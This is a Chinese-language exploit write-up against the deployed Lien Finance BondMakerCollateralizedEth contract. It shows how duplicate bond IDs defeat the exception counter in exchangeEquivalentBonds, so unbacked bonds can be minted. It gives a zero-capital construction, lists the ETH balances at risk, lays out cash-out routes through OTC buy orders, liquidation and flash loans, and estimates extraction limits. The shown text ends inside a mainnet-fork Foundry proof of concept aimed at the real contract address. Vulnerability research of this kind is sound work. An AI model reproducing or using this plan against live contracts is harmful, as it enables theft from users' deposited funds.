| **2. GeneralizedDotc 合约 ETH 余额与账本**<br/>• **实际位置**：<br/>  - 链上实际 ETH：`address(GeneralizedDotc).balance`<br/>  - 内部记账映射：`mapping(address => uint256) _depositedEth`<br/>• **机制**：用户通过 `depositEth()` 存入的 ETH，按地址记账。<br/>• **当前具体数值**：<br />GeneralizedDotc(0x656e5e976d523a427f05B0c212A22A89ccD9eF18):Balance : 0 ETH (0 wei). 由于是GeneralizedDotc的余额是0, 就没必要看各个用户存入的值了. 因为各个用户存入的总和必定小于等于GeneralizedDotc的余额 | **2.1 存款用户提现索赔 (Withdraw Deposited ETH)**<br/>• **索赔依据**：在 `_depositedEth[msg.sender]` 中有记账余额的用户（如准备买债券的买家，或卖债券已收 ETH 的卖家），调用 `withdrawEth()` 随时全额提现。<br/><br/>**2.2 OTC 交易划扣结算 (Exchange ETH <-> Bond)**<br/>• **索赔依据**：买家调用 `exchangeEthToBond`（扣除买家记账 ETH 打给卖家）或 `exchangeBondToEth`（扣除卖家记账 ETH 直接打给买家钱包）。 |
| **3. 已清算 BondToken 合约中的 ETH 余额**<br/>• **实际位置**：`address(BondToken_i).balance`<br/>• **机制**：由 `BondMaker` 在 `liquidateBond` 时划入该债券代币合约。<br/>• **当前具体数值**：见下方 x | **3.1 债券持有人兑付索赔 (Burn Bond Token)**<br/>• **索赔依据**：持有已清算 `BondToken` 的用户调用 `burn(amount)` 或 `burnAll()`，销毁代币按 payoff 比例领取存放在该 `BondToken` 合约内的 ETH。 |

x: 已清算 BondToken 合约中的 ETH 余额

```
====================================================================
bondIDs in export (unique):   131
  resolved to an address:     131
  zero address (skipped):     0
  distinct bond addresses:    131
  with a non-zero balance:    19
--------------------------------------------------------------------
TOTAL: 222809193915284959882 wei
       222.809193915284959882 ETH
====================================================================

Bond addresses holding ETH at this block:
  0xa1544db1b6d385c6c4c4ed4998184e2edccaf2c6        132.792594766681079907 ETH  (132792594766681079907 wei)
  0x001ad11b451379ac5766180648dfdba0e1c5aaaf         56.913843938832889809 ETH  (56913843938832889809 wei)
  0xace592c389a171ff2d5cb0ab108b2e7ab536813e         22.132099127780179984 ETH  (22132099127780179984 wei)
  0xd59d99e928f5b0fca046b748522bae97401b207e          9.274307931989322705 ETH  (9274307931989322705 wei)
  0x4e35a4987d6a0a1318d362d1dbddf0d43aac24b0          0.937256572654670006 ETH  (937256572654670006 wei)
  0x0ac5fb64838f9d642c96266a4e5e7ba37eb56a89          0.625021267094376898 ETH  (625021267094376898 wei)
  0x7463d7078841d95134d3f2e7e60d76b59f664628          0.113640230380795800 ETH  (113640230380795800 wei)
  0xa567556f135e77e68c4c0b3f867068c28659e2af          0.020430079871644757 ETH  (20430079871644757 wei)
  0x086d401c5652b790fe55d464aee61f3993a83ae2          0.000000000000000004 ETH  (4 wei)
  0x35f1673dce7a4185921bdac9560dcc56c5764cb4          0.000000000000000002 ETH  (2 wei)
  0xb026afbad95aeebde9f618dcb6b0dea53e7dff98          0.000000000000000002 ETH  (2 wei)
  0x13fa2be1b83f692886fbe11de14126c85a74257c          0.000000000000000001 ETH  (1 wei)
  0x2d3cf5562d6527108fd49d66becff93a69fcbc0e          0.000000000000000001 ETH  (1 wei)
  0x530822e73daa576651cf9a8f877c7a82387c7e52          0.000000000000000001 ETH  (1 wei)
  0x6392cef341ba882708f440351002ed53355c7428          0.000000000000000001 ETH  (1 wei)
  0x8726606a5c4f65a25be5f75b02894cd930a97cd6          0.000000000000000001 ETH  (1 wei)
  0x981725e0faa418750755602b7a17f2a15a85a0b9          0.000000000000000001 ETH  (1 wei)
  0xa803e5c63b439054c29aba53e4090ba8df890a01          0.000000000000000001 ETH  (1 wei)
  0xf89278be775f18c523af964e2bf66413211594e0          0.000000000000000001 ETH  (1 wei)
```

### 池 #1 (BondMaker 共享 ETH 池) 动钱节点与不变量分析表

| 路径                                                         | 它假设为真的等式是什么？                                     | 该等式在何处/何时建立？                                      | 在该路径执行时该等式仍然成立吗？                             |
| :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| **1.1 提前赎回 ETH** (`reverseBondGroupToCollateral`)<br />BondMakerCollateralizedEth.sol:L2037-L2062<br /> | 销毁 BondGroup 组内每只债券各 N 份 ≡ 退还按 `_applyDecimalGap(N,8,18)` 定额换算的 ETH。假设：只要完整销毁组内每只债券各 N 份，就等于归还了铸造这 N 份时投入的等额 ETH。 | **建立时机**：`registerNewBondGroup`（定义组内绑定关系，并经 `_assertBondGroup` 校验价值守恒）与 `issueNewBonds`（存入 D ETH 时按同一 D 铸造组内每只债券各 D 份）。 | **成立（True）**。`reverse` 只按代币数量做定额换算，不读 fnMap、不读预言机；与 `issue` 构成对称的一次性存取循环。只要 `_assertBondGroup` 保证了这个组本身价值守恒（价格无关），这条等式对任何合法注册组恒真。 |
| **1.2 到期清算划拨** (`liquidateBond`)<br />**清算源码**：BondMakerCollateralizedEth.sol:L2155-L2197<br />**守恒建立源码**：BondMakerCollateralizedEth.sol:L1870-L1920 | 对**本组自身发行的全部供应量**：Σᵢ payoff(Bond_i, P_settle) ≡ P_settle，对任意结算价恒成立。**这只证明"若该组名下代币全部来自本组 1:1 issue，则清算账目自洽"**——不等于"清算划拨的 ETH 不会超额索赔池内其他抵押品"这个更强的系统级结论；后者还依赖一个此处未被验证的前提：流通中的这些代币确实只经由 `issueNewBonds` 铸出。 | **建立时机**：`registerNewBondGroup` 时刻。`_assertBondGroup` 在组内每只债券的所有线段右端点采样，用精确分数 `totalBondPriceN == totalBondPriceD × rate` 校验 payoff 总和恒等于标的价（非浮点比较，无舍入误差）。 | **局部成立（True，但有隐藏前提）**。采样虽只在断点，但最后一段 `right.x` 本身也是采样点、且单段斜率被钳制在 `[0,1]`，隐式覆盖了全定义域——**组自身的 payoff 配方对价值守恒是真的**。但这只是"配方"层面的真，不是"供应量"层面的真：`liquidateBond` 对任意持有该 bond token 的人一视同仁地兑付，并不追问这些代币最初是否真的来自 1:1 抵押的 `issueNewBonds`。真正的系统级偿付能力还要看 1.3 是否成立。 |
| **1.3 等价债券互换** (`exchangeEquivalentBonds`)<br />BondMakerCollateralizedEth.sol:L2083-L2136 | Input 组销毁的非例外债券价值 ≡ Output 组铸造的非例外债券价值。假设经过 `exceptionBonds`（例外保留债券）过滤后，输入侧被销毁的债券价值与输出侧凭空铸造的债券价值完全相等，不会向系统中注入未经 ETH 抵押支撑的超额索赔权。 | **建立时机**：`exchangeEquivalentBonds` **函数执行当场**——校验（匹配计数）和使用（烧/铸）在同一次调用内完成，**不存在 1.1/1.2 那种"注册时校验、日后使用"的时间差**。依赖其内部的双重循环匹配计数（`exceptionCount`）来验证例外债券在两组中的存在性。 | **不成立！（False —— 核心漏洞原语）**。`exchangeEquivalentBonds` 内部用的是"匹配计数"而非"集合相等"。结合 `registerNewBondGroup` 不对 `bondIDs` 去重的缺陷，攻击者可构造含重复元素的组，凭空铸出输出组独有的无抵押债券。**由于校验与使用同时发生，这一行的破绽必然出在"校验是否完整"（是否真的等价于集合包含），而不可能是"时机是否被绕过"——这为下一步 Phase 3 定位问题类型提供了依据。** |

分析补充说明：

1. **共享池风险传递**：由于 `BondMakerCollateralizedEth` 的 ETH 抵押品是**全局单池**、不按 `BondGroup` 做子账本隔离，路径 1.1 与 1.2 对合法注册的 BondGroup 虽能保持内部守恒；但一旦路径 1.3 破裂（凭空造出了未经 ETH 抵押的独立索赔权），这些凭空造出的债券就可以通过清算（路径 1.2）或在二级市场上变现，进而**跨组掏空**其他合法发行人在共享池中存入的真实 ETH 抵押品。
2. **为什么 1.3 是打破整个系统资产负债平衡的唯一缺口**：在 Phase 2 的盘问中可以看到，1.1 和 1.2 均强绑定于“已存入 ETH 的合法组”，唯独 1.3 在“未存入新 ETH”的前提下允许铸造新代币，且其依赖的“计数 ≡ 集合”假定在执行当场被证明为假。



## 关于 等价债券互换

`exchangeEquivalentBonds`, BondMakerCollateralizedEth.sol:L2083-L2136



```solidity
    /**
     * @notice Burns set of LBTs and mints equivalent set of LBTs that are not in the exception list.
     * @param inputBondGroupID is the BondGroupID of bonds which you want to burn.
     * @param outputBondGroupID is the BondGroupID of bonds which you want to mint.
     * @param exceptionBonds is the list of bondIDs that should be excluded in burn/mint process.
     */
    function exchangeEquivalentBonds(
        uint256 inputBondGroupID,
        uint256 outputBondGroupID,
        uint256 amount,
        bytes32[] calldata exceptionBonds
    ) external virtual override returns (bool) {
        (bytes32[] memory inputIDs, uint256 inputMaturity) = getBondGroup(
            inputBondGroupID
        );
        _assertNonEmptyBondGroup(inputIDs);
        (bytes32[] memory outputIDs, uint256 outputMaturity) = getBondGroup(
            outputBondGroupID
        );
        _assertNonEmptyBondGroup(outputIDs);
        require(
            inputMaturity == outputMaturity,
            "cannot exchange bonds with different maturities"
        );
        _assertBeforeMaturity(inputMaturity);

        bool flag;
        uint256 exceptionCount;
        
        
        // 第一轮：遍历 Input 组，销毁非例外债券，并用 exceptionCount 累加匹配数
        for (uint256 i = 0; i < inputIDs.length; i++) {
            flag = true;
            for (uint256 j = 0; j < exceptionBonds.length; j++) {
                if (exceptionBonds[j] == inputIDs[i]) {
                    flag = false;
                    // 匹配到例外债券，计数器 +1
                    exceptionCount = exceptionCount.add(1);
                }
            }
            if (flag) {
                _burnBond(inputIDs[i], msg.sender, amount); // 烧掉 Input 侧非例外债券
            }
        }

        // 检查一：要求 Input 侧匹配计数等于 exceptionBonds.length
        require(
            exceptionBonds.length == exceptionCount,
            "All the exceptionBonds need to be included in input"
        );

        // 第二轮：遍历 Output 组，铸造非例外债券，并从 exceptionCount 中扣减匹配数
        for (uint256 i = 0; i < outputIDs.length; i++) {
            flag = true;
            for (uint256 j = 0; j < exceptionBonds.length; j++) {
                if (exceptionBonds[j] == outputIDs[i]) {
                    flag = false;
                    exceptionCount = exceptionCount.sub(1); // 扣减计数器
                }
            }
            if (flag) {
                _mintBond(outputIDs[i], msg.sender, amount); // 凭空铸造 Output 侧非例外债券
            }
        }

        // 检查二：要求计数器必须正好扣减回 0
        require(
            exceptionCount == 0,
            "All the exceptionBonds need to be included both in input and output"
        );

        emit LogExchangeEquivalentBonds(
            msg.sender,
            inputBondGroupID,
            outputBondGroupID,
            amount
        );

        return true;
    }
```



### 一、 三个问题

#### 1. 问题 1：输入是否可控？

**答案：对于协议不可控,但对于攻击者 100% 完全可控。**

攻击者可以在执行 `exchangeEquivalentBonds` 之前，自由准备和控制所有的“原料”：
- **`registerNewBond`**：无许可。攻击者可传入任意符合 `assertPolyline` 约束的折线 `fnMap`，注册任意类型的债券代币 `bondID`。

- **`registerNewBondGroup`**：无许可。攻击者可将任意符合采样点守恒 $\sum \text{payoff}_i(x) \equiv x$ 的 `bondIDs` 打包为组。**最关键的是：`registerNewBondGroup` 代码中完全没有对 `bondIDs` 数组做去重检查！** 攻击者可以在一个组内多次填入同一个 `bondID`。

- **`exchangeEquivalentBonds`**：无许可。攻击者可自由指定 `inputBondGroupID`、`outputBondGroupID`、`amount` 以及任意选择的 `exceptionBonds` 数组。

#### 2. 问题 2：检查是否完备？

**答案：否。匹配计数算法存在逻辑漏洞（账实分离）。**

合约中的实际校验逻辑如下：
* **Input 侧循环**：对 $I$ 中的每个元素，与 $E$ 逐个比对。若匹配到 $E$ 中的元素，`exceptionCount` 加 1，且该 Input 债券**不被销毁**；未匹配到的 Input 债券被**销毁（Burn）**。末尾执行 `require(E.length == exceptionCount)`。
* **Output 侧循环**：对 $O$ 中的每个元素，与 $E$ 逐个比对。若匹配到 $E$ 中的元素，`exceptionCount` 减 1，且该 Output 债券**不被铸造**；未匹配到的 Output 债券被**凭空铸造（Mint）**。末尾执行 `require(exceptionCount == 0)`。

**漏洞形式化描述**：
如果 Output 组 $O$ 中存在**重复的债券**，那么这同一个重复债券会在 Output 循环中被多次匹配，使 `exceptionCount` 多次递减。这就导致：**即使 Input 组中的某个例外债券 $H$ 根本不存在于 Output 组中，重复的债券也会“顶替”它的名额，将 `exceptionCount` 减归为 0 并强行通过 `require`**！

#### 3. 问题 3：时机是否正确？
**答案：无关紧要（原子性执行）。**

`exchangeEquivalentBonds` 在同一个以太坊交易内同步执行完毕，不存在任何跨区块（T1/T2）的时间间隙、异步回调或锁定期。只要调用触发，烧币与铸币在同一个函数帧内即刻完成。



### 二、 具体数值与债券形态构造证明

我们选择参数 $K = 1000$，构造 4 只合法的债券，并组装 Input 组 $I$ 和 Output 组 $O$。

#### 1. 债券定义（均满足 assertPolyline 与 _isBondWorthless 约束）

| 债券符号       | 形状描述       | 坐标折线点 $(x, y)$                              | 收益函数 $\text{payoff}(P)$                    | `solidStrikePrice` |
| :------------- | :------------- | :----------------------------------------------- | :--------------------------------------------- | :----------------- |
| **Bond $H$**   | 劣后债券 (LBT) | $(0,0) \to (1000,0) \to (2000,1000)$             | $f_H(P) = \max(P - 1000, 0)$                   | $0$ (非 PURE_SBT)  |
| **Bond $L_c$** | 半价封顶债券   | $(0,0) \to (2000,1000) \to (3000,1000)$          | $f_{L_c}(P) = \min(P/2, 1000)$                 | $0$ (非 PURE_SBT)  |
| **Bond $R$**   | 三角屋顶债券   | $(0,0) \to (1000,500) \to (2000,0) \to (3000,0)$ | $f_R(P) = \text{峰值 } 500 \text{ 的三角区间}$ | $0$ (非 PURE_SBT)  |
| **Bond $S$**   | 高行权价 LBT   | $(0,0) \to (2000,0) \to (3000,1000)$             | $f_S(P) = \max(P - 2000, 0)$                   | $0$ (非 PURE_SBT)  |

> **合法性验证**：上述 4 只债券的首段均起始于 $(0,0)$，相邻线段斜率不相等，最后一段斜率均落在 $[0, 1]$ 内，且均不为 0。完全符合 `registerNewBond` 的校验。



#### 2. 债券组构造与守恒验证

* **Input 组 $I = [L_c, H, R]$**（3 只债券）：
  * 当 $0 \le P \le 1000$ 时：$f_{L_c} + f_H + f_R = \frac{P}{2} + 0 + \frac{P}{2} = P$
  * 当 $1000 \le P \le 2000$ 时：$f_{L_c} + f_H + f_R = \frac{P}{2} + (P - 1000) + (1000 - \frac{P}{2}) = P$
  * 当 $P \ge 2000$ 时：$f_{L_c} + f_H + f_R = 1000 + (P - 1000) + 0 = P$
  * **结论**：对任意 $P$，$\sum_{i \in I} f_i(P) \equiv P$。**组 $I$ 100% 守恒，在链上成功注册！**

* **Output 组 $O = [L_c, L_c, S]$**（包含重复元素 $L_c$）：
  * 当 $0 \le P \le 2000$ 时：$2 \cdot f_{L_c} + f_S = 2 \cdot \frac{P}{2} + 0 = P$
  * 当 $P \ge 2000$ 时：$2 \cdot f_{L_c} + f_S = 2 \cdot 1000 + (P - 2000) = P$
  * **结论**：对任意 $P$，$\sum_{j \in O} f_j(P) \equiv P$。由于 `registerNewBondGroup` 不限制重复元素，**组 $O$ 100% 守恒，在链上成功注册！**

> **前置条件（补充）**：`exchangeEquivalentBonds` 要求 `inputBondGroupID` 与 `outputBondGroupID` 的 `maturity` 相同且均未到期。这对本构造毫无阻碍——$H, L_c, R, S$ 四只债券在各自 `registerNewBond` 时传入同一个 `maturity` 参数即可，`registerNewBondGroup` 也不会因此拒绝注册。



#### 3. 漏洞触发与追踪过程

攻击者准备 `exceptionBonds = [H, L_c]`，调用 `exchangeEquivalentBonds(I, O, amount=1, [H, L_c])`：

#### (1) Input 侧循环 (`inputIDs = [L_c, H, R]`)
* `inputIDs[0] = L_c`：匹配到 `exceptionBonds` 中的 $L_c$，`exceptionCount`变为 **1**，**不销毁 $L_c$**。
* `inputIDs[1] = H`：匹配到 `exceptionBonds` 中的 $H$，`exceptionCount` 变为 **2**，**不销毁 $H$**。
* `inputIDs[2] = R`：未匹配，**销毁（Burn）1 份 Bond $R$**。
* **检查一**：`require(exceptionBonds.length == exceptionCount)` $\implies$ `require(2 == 2)`，**通过！**

#### (2) Output 侧循环 (`outputIDs = [L_c, L_c, S]`)
* `outputIDs[0] = L_c`：匹配到 `exceptionBonds` 中的 $L_c$，`exceptionCount` 从 2 减为 **1**，**不铸造 $L_c$**。
* `outputIDs[1] = L_c`（重复元素）：再次匹配到 `exceptionBonds` 中的 $L_c$，`exceptionCount` 从 1 减为 **0**，**不铸造 $L_c$**！
* `outputIDs[2] = S`：未匹配，**凭空铸造（Mint）1 份 Bond $S$**！
* **检查二**：`require(exceptionCount == 0)` $\implies$ `require(0 == 0)`，**通过！**

---

### 三、 结果分析：朴素集合校验 vs 实际计数校验

| 校验模型              | 对本例组合的判断  | 理由                                                         |
| :-------------------- | :---------------- | :----------------------------------------------------------- |
| **朴素集合相等/包含** | **拒绝 (Revert)** | $E = \{H, L_c\}$ 不是 $O = \{L_c, L_c, S\}$ 的子集（因为 Bond $H \notin O$）。应当拒绝此交易。 |
| **实际匹配计数**      | **通过 (Pass)**   | 重复的 $L_c$ 成功抵消了原本属于 $H$ 的计数，使 `exceptionCount` 顺利归零。 |

### 四、 链上可执行性佐证

本节推导的构造并非停留在纸面：`POC_ExchangeBug/test/ExchangeBug.t.sol` 是同一骨架（3 债券 Input 组 + 含重复元素的 2 铸造位 Output 组 + `exceptionBonds` 取"被顶替的那两只"）在主网 fork（block 25599301）上对真实 `BondMakerCollateralizedEth` 字节码的 Foundry 复现，`test_exchange_mints_unbacked` 通过：一次 `exchangeEquivalentBonds` 调用烧掉输入组的"多余"债券、凭空铸出输出组独有的债券，全程不花一分 ETH。也就是说，Phase 3 在此推出的并非仅是一个理论上成立的反例，而是一个已经过链上验证、可执行的破绽。



### 五、 可达性与攻击成本正向推导与分析

#### 核心问题 1：单笔交易原子性

根据攻击者选择的**变现出口（Exit Vector）**不同，攻击的执行时空边界分为以下两种路径：

##### 路径 A：OTC 场馆卖币变现路径 (`exchangeBondToErc20` / `exchangeBondToEth`)

* 时间边界：100% 单笔交易原子化（Single-Tx Atomic）。
* 执行链条：
  $$\text{registerNewBond} \to \text{registerNewBondGroup} \to \text{exchangeEquivalentBonds} \to \text{exchangeBondToErc20}$$
* 机制说明：  
  如果二级市场上事先存在“付 ERC20/ETH 收债券”的买单 Pool（`isBondSale = false`），整个攻击链条（从注册债券、打包债券组、凭空铸币到向买单出售套现）可以在同一个智能合约调用中连贯、同步地在单个区块内完成，没有任何时间延迟或跨区块约束。

##### 路径 B：到期清算变现路径 (`liquidateBond`)

* 时间边界：跨区块 / 需等待至到期日。
* 执行链条：
  $$\text{注册与铸币 (Block } T_0) \xrightarrow{\quad \text{等待至到期日 } T_{\text{maturity}} \quad} \text{liquidateBond (Block } T_{\text{maturity}})$$
* 机制说明：  
  由于 `liquidateBond` 严格要求 `block.timestamp >= maturity`，若攻击者选择等到期后直接从 BondMaker 的 ETH 共享抵押品池按 fnMap payoff 兑付，则无法在部署注册的同一区块内完成套现，必须跨越时间边界等待至到期日。

##### 路径 B'：反向赎回变现路径 (`reverseBondGroupToCollateral`) —— 时间边界与路径 B 相反

* 时间边界：**同样 100% 单笔交易原子化**。`reverseBondGroupToCollateral` 的条件恰恰是**必须在到期日之前**（"未到期"，见前文 BondMaker 分析章节）调用，与 `liquidateBond` 的时间方向相反——不存在"等待到期"这一说，不应与路径 B 归为同一时间边界类别。
* 执行链条：
  $$\text{registerNewBond} \to \text{registerNewBondGroup} \to \text{exchangeEquivalentBonds} \to \text{reverseBondGroupToCollateral}$$
* 机制说明：  
  只要攻击者持有某个已注册 BondGroup（如 Output 组 $O$）内每只债券各 `bondAmount` 份，理论上就能立即按 `_applyDecimalGap(bondAmount,8,18)` 定额换回 ETH，同样在单笔交易内完成。**但实际可达性受限于代币余额是否凑齐**：以 $O=[L_c, L_c, S]$ 为例，反向赎回需要 $2 \times \text{bondAmount}$ 份 $L_c$，而攻击者通过 exchange 实际只持有 $1 \times \text{bondAmount}$ 份 $L_c$（因为 $L_c$ 是 `exceptionBonds`、未被重新铸造，余额维持在 issue 时的水平）——**这条路径会因代币余额不足而失败**。这正是路径 A（走 DEX 卖出 $S$）成为唯一现实变现出口的直接机制原因，而不仅仅是"共享池当时余额太小"这个经验观察。



#### 核心问题 2：前期资金要求与损耗成本

正向推理分析表明，根据输入组 $I$ 中债券在 `exceptionBonds` 中的覆盖程度，存在以下两种资金消耗变体：

##### 变体 1：零 ETH 存入 / 零初始代币持有的极致路径（Zero-Capital Pure Mint Path）

先前一度认为该路径不通, 问题所在：让输入组 $I$ 的**全部**元素都进 `exceptionBonds`（零烧毁）之后，输出组 $O$ 必须用"某只旧债券重复 $k$ 次 + 一只新债券 $Z$"来吸收掉全部 `exceptionCount`；守恒反解出 $f_Z = P - k \cdot f_{\text{dup}}(P)$。要让 $f_Z \ge 0$ 处处成立，**唯一的真实约束**是：被重复的那只债券 $f_{\text{dup}}(P)$ 必须**不超过 $P/2$**（若重复 2 次）。之前把 $H$（$f_H(P)=\max(P-1000,0)$）拿来凑数——但 $H$ 在 $P$ 较小时贴着 $P$ 走、远大于 $P/2$，注定解不出非负的 $Z$。**真正该盯上的是 $L_c$**：它在本文档最早的定义里就是"$P$ 的一半、封顶"，即 $f_{L_c}(P) = \min(P/2, 1000) \le P/2$ **对所有 $P$ 恒成立**——这正是重复它两次时所需要的性质，我们一直有这只债券，只是没往这个方向凑。

* **重新构造**：只需给 $L_c$ 配一个"互补"债券 $C$，定义为 $f_C(P) \equiv P - f_{L_c}(P)$：
  * 坐标折线点：$(0,0) \to (2000, 1000) \to (3000, 2000)$，即 $0\le P\le 2000$ 时 $f_C=P/2$，$P\ge 2000$ 时 $f_C=P-1000$。
  * **合法性**：首段起于 $(0,0)$；相邻斜率 $0.5 \to 1$ 不相等；末段斜率 $=1 \in [0,1]$；处处非零。满足 `registerNewBond` 全部约束，可注册。
* **Input 组 $I = [L_c, C]$**（仅 2 只债券）：$f_{L_c}+f_C \equiv P/2+P/2=P$（$P\le2000$）、$1000+(P-1000)=P$（$P\ge2000$），**恒等于 $P$，可注册**。
* **`exceptionBonds` $= [L_c, C]$** —— $I$ 的全部元素都在例外名单里。Input 侧循环两个都匹配，`count` $0\to1\to2$，`require(2==2)` 通过，**烧毁数 = 0**。
* **Output 组沿用已验证过的 $O=[L_c, L_c, S]$**（本文档第二节已证明 $2f_{L_c}+f_S\equiv P$，此处直接复用）。Output 侧循环：两个 $L_c$ 各消耗一次 `count`（$2\to1\to0$），$S$ 未匹配 → **凭空铸造**；`require(count==0)` 通过。
* **净结果**：烧毁 0、存入 ETH 0，凭空铸出 $S$。攻击者发起前不需要持有 $L_c$、$C$、$S$ 中的任何一只。

* 构造特征：  
  将输入组 $I=[L_c,C]$ 中的全部债券列入 `exceptionBonds`（零烧毁），输出组沿用 $O=[L_c,L_c,S]$（重复元素吸收全部 `exceptionCount`，$S$ 凭空铸造）。
* 资金与代币需求：
  * 所需 ETH 存入：0 wei。攻击者完全不需要调用 `issueNewBonds` 存入任何 ETH 抵押品。
  * 所需代币余额：0。Input 侧循环全部匹配为例外，`_burnBond` 在整个交易中被执行 0 次，攻击者发起前不需要持有任何债券代币。
* 沉没损耗成本：  
  仅需支付以太坊链上 Gas 费，以及 OTC 交易的 Spread 摩擦。

> **方法学教训**：第一次判定"不成立"时，我们把注意力放在"能否救活 $H/L_c/R$ 这三只旧债券"上，一直在旧集合内部打转（试了 $[L_c,L_c,L_c,S]$、$[L_c,L_c,H,S]$ 等排列组合），没有退回一步问"新债券非负，到底需要被重复的那只债券满足什么性质"。穷举几个具体组合失败，只能证明"这几个具体组合不行"，不能证明"这类构造不可行"——真正该做的是先把约束条件（$f_{\text{dup}}\le P/2$）解出来，再去问手头有没有、或能不能设计出满足这个条件的债券。$L_c$ 从一开始就满足，只是我们没有专门检验过它。

##### 变体 2：微量 ETH 存入 / 少量种子代币路径（Minimal-Capital Seed Path，非最低资本，仅作对比）

> 变体 1 已证明零资本可行，因此本变体不是真实的资本下限，而是"当找不到满足 $f_{\text{dup}}\le P/2$ 的合适债券对时"的次优回退：接受烧毁一只非例外债券（$R$），换取不必设计新的互补债券。列在此处供对比成本量级。

* 构造特征：  
  输入组 $I$ 中存在未被例外的债券 $R$（例如 $I = [L_c, H, R]$，`exceptionBonds` $= [H, L_c]$）。
* 资金与代币需求：
  * 所需代币余额：仅需持有非例外债券 $R$ 的余额 $\ge \text{amount}$。
  * 所需 ETH 存入：需通过 `issueNewBonds(I)` 存入微量 ETH 以铸造 $R$ 的初始余额。由于 1 个 BondToken 最小单位仅对应 $10^{10}$ wei（0.00000001 ETH），所需的种子 ETH 极其微小。
  * 闪电贷无缝接入：这笔微量 ETH 亦可通过闪电贷在同笔交易中借入并在卖币套现后归还，实现自有资金零占用。
* 沉没损耗成本：  
  `issueNewBonds` 的 0.2% 协议铸造折减费（`fee = ceil(msg.value * 2 / 1002)`）+ Gas 费。该 0.2% 留存于池内作为准备金，但后续套利收益远超此项损耗。



#### 核心问题 3：攻击规模上限与容量瓶颈

正向梳理系统在不同变现出口下的容量瓶颈与提取上限：

##### 做市商/买单 Pool 的流动性与授权额度瓶颈（OTC 卖币出口）

* 套利上限：受限于外部做市商（或 Pool 挂单方）在 `GeneralizedDotc` / OTC 场馆挂出的买单可用余额与 ERC20 授权额度 (`Allowance`)。
* 瓶颈机制：买方按 Black-Scholes 模型自动接单，攻击者能凭空套走的最大金额即为买方在此类买单上敞口的资金上限。

##### BondMaker 共享 ETH 抵押品池余额瓶颈（到期清算/反向赎回出口）

* 套利上限：受限于 `address(BondMakerCollateralizedEth).balance`（合约中所有合法用户存入的原生 ETH 抵押品总量）。
* 瓶颈机制：凭空铸造的高收益债券在到期清算时会持续抽干全局共享池里的 ETH，直到池子余额完全耗尽。

##### EVM 交易 Gas 限制与数组循环步长

* 单笔交易的 Gas Limit 限制了 `exchangeEquivalentBonds` 中 `bondIDs` 数组与 `exceptionBonds` 数组的最大匹配规模与批次大小。



## POC

### 验证BUG可行性

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////
  Lien Finance BondMakerCollateralizedEth
  exchangeEquivalentBonds 计数漏洞 —— POC 1：证明可以免费铸出无抵押债券。
  （怎么把这些债券变现是另一个还没写的 POC 2。）

  ── 漏洞是什么 ──
  BondMaker 允许任何人无许可地：
    1. registerNewBond(maturity, fnMap)        注册一只"债券"（一段收益
       随标的价 P 变化的折线）。
    2. registerNewBondGroup(bondIDs, maturity) 把若干只债券打包成一个
       "组"，前提是组内所有债券的 payoff 之和，在任意 P 下都恒等于 P
       （即"组内债券 = 1 份完整抵押品的拆分"，由 _assertBondGroup 校验）。
    3. exchangeEquivalentBonds(inputGroup, outputGroup, amount, exceptionBonds)
       把 amount 份 inputGroup 换成 amount 份 outputGroup：
         - inputGroup 里"不在 exceptionBonds 里"的债券会被烧掉；
         - outputGroup 里"不在 exceptionBonds 里"的债券会被铸造；
         - exceptionBonds 本该代表"两组共有、双方都不动"的那部分。

  正确的语义要求 exceptionBonds 按"集合包含"来判断（output 组里根本不
  存在的债券，不该被 exceptionBonds 保护）。但合约实际实现的是"匹配
  计数"：input 循环里每命中一次 exceptionBonds 中的某个值，计数 +1；
  output 循环里每命中一次，计数 -1；只要最终计数归零就放行。因为
  registerNewBondGroup 从不对 bondIDs 去重，同一个 bondID 可以在一个组
  的数组里出现两次——它就能在 output 侧被"按值"独立匹配两次（合约不会
  标记某个 exceptionBonds 名额已被消耗），从而顶替掉本该分配给另一只
  "output 组里根本不存在"的债券的名额。那只债券于是被凭空铸造，不需要
  在 input 侧烧掉任何等值的东西。

  ── 本文件证明什么 ──
  test_zero_capital_free_mint（POC 1 主证据）：构造一个 2 元 input 组，
  让它的两只债券**都**列入 exceptionBonds（input 侧烧毁数 = 0）；output
  组里让其中一只债券重复出现两次，顶掉两个例外名额，让第三只全新的
  债券凭空铸出。整个过程不调用 issueNewBonds、不需要预先持有任何代币，
  就能铸出任意数量的新债券。

  test_exchange_mints_unbacked / test_drain_via_liquidate 是更早期、
  资本效率更低的构造，保留作对比，见各自函数上方注释。

  运行：
    forge test --fork-url <ETH_RPC> --fork-block-number 25599301 \
        --match-contract ExchangeBugTest -vvv
//////////////////////////////////////////////////////////////*/

interface IBondMaker {
    function registerNewBond(uint256 maturity, bytes calldata fnMap)
        external
        returns (bytes32 bondID, address bondTokenAddress, bytes32 fnMapID);

    function registerNewBondGroup(bytes32[] calldata bondIDs, uint256 maturity)
        external
        returns (uint256 bondGroupID);

    function issueNewBonds(uint256 bondGroupID) external payable returns (uint256 bondAmount);

    function exchangeEquivalentBonds(
        uint256 inputBondGroupID,
        uint256 outputBondGroupID,
        uint256 amount,
        bytes32[] calldata exceptionBonds
    ) external returns (bool);

    function reverseBondGroupToCollateral(uint256 bondGroupID, uint256 bondAmount)
        external
        returns (bool);

    function liquidateBond(uint256 bondGroupID, uint256 oracleHintID)
        external
        returns (uint256 totalPayment);

    function getBond(bytes32 bondID)
        external
        view
        returns (address bondTokenAddress, uint256 maturity, uint64 solidStrikePrice, bytes32 fnMapID);

    function oracleAddress() external view returns (address);
    function maturityScale() external view returns (uint256);
}

interface IBondToken {
    function balanceOf(address) external view returns (uint256);
    function burnAll() external returns (uint256 amount);
    function totalSupply() external view returns (uint256);
}

interface IOracle {
    function latestId() external returns (uint256);
    function getPrice(uint256 id) external returns (uint256);
    function getTimestamp(uint256 id) external returns (uint256);
}

contract ExchangeBugTest is Test {
    IBondMaker constant BM = IBondMaker(0xDA6FC5625E617bB92F5359921D43321cEbC6BEf0);

    // 价格/收益均为预言机 8 位精度单位（1 USD = 1e8）
    uint64 constant K      = 100 * 1e8;    // $100，下面几只债券的行权价基准
    uint64 constant K2     = 200 * 1e8;    // $200 = 2K
    uint64 constant KH     = 50 * 1e8;     // K/2，仅 legacySacrifice 的峰值用到
    uint64 constant XM     = 100000 * 1e8; // $100k，远大于任何可能的结算价；
